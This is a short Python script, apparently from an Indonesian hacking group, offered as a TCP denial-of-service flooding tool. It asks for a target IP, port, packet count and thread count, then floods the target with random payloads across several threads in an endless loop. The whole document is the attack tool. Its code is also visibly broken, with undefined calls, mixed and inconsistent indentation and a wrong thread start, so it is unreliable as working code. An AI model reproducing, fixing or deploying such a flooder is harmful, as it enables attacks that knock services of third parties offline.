# TOOLS UNTUK TCP 
# Xsvs Comunity

import socket
import random
import threading
import os

def banner(): # Banner
    os.system("cls || clear")
    print(fr"""
██████╗░██╗░░░██╗██╗░░░░░██╗░░░░░
██╔══██╗██║░░░██║██║░░░░░██║░░░░░
██████╔╝██║░░░██║██║░░░░░██║░░░░░
██╔══██╗██║░░░██║██║░░░░░██║░░░░░
██║░░██║╚██████╔╝███████╗███████╗
╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝
 """)

ip = str(input('[+] IP: ' ))
port = int(input('[+] PORT: '))
packet = int(input('[+] PACKET: '))
thread = int(input('[+] THREADS: '))

def DDOS():
	Xeamus = random._urandom(1020)
	xx = int(0)
	while True:
		try:
		     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		     s = connect((ip,port))
		     s = send(Xeamus)
		     for i in range(packet):
			       s.send(Xeamus)
			 xx += random.randint(0, int(packet))
			 print('Sedang Menyenggol '+ip+ 'sent!!!' +str(xx))
        except:
       	   s.close()
           print(' Berhasil Tersenggol ')

 for x in range(thread):
	 thred = threading.Thread(target=DDOS)
	 thred.DDOS()
